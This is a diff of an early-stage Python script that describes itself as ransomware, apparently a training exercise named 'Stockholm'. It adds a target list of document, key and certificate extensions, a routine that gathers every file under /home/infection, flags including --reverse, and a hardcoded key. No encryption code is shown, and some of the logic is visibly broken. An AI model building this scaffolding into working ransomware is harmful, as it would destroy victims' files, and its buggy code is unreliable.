@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 import os
+import argparse
+from mdprint import mdprint
 
 extensions = ('.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw',
               '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif',
@@ -20,11 +22,34 @@ extensions = ('.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.
               '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls',
               '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc')
 
-def check_directory():
+def get_files_list():
     path = "/home/infection"
-    if not os.path.exits():
-        print("Hola")
-    else:
-        print("Adios")
+    file_list = []
+    if not os.path.exists(path):
+        print("Error: path do not exits.\n")
+    files = os.walk(path)
+    for file in files:
+        for f in file[2]:
+            file_list.append(file[0] + "/" + f)
+    return(file_list)
 
-check_directory()
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='My own private ramsonware.', add_help=False)
+    parser.add_argument('--reverse', action='store_true')
+    parser.add_argument('-s', '--silent', action='store_true')
+    parser.add_argument('-v', '--version', action='store_true')
+    parser.add_argument('-h', '--help', action='store_true')
+    args = parser.parse_args()
+    if len(args.reverse) == 0:
+        args.key = "1324-Nano."
+    print(args.reverse)
+    #     get_files_list()
+    # if not args.key:
+    #     args.key = "1324-Nano."
+    # # if args.help:
+    # #     with open("README.md", 'w') as f:
+    # #         print(f.readlines())
+    # if args.version:
+    #     print("Stockholm version 1.0.0")
+    get_files_list()
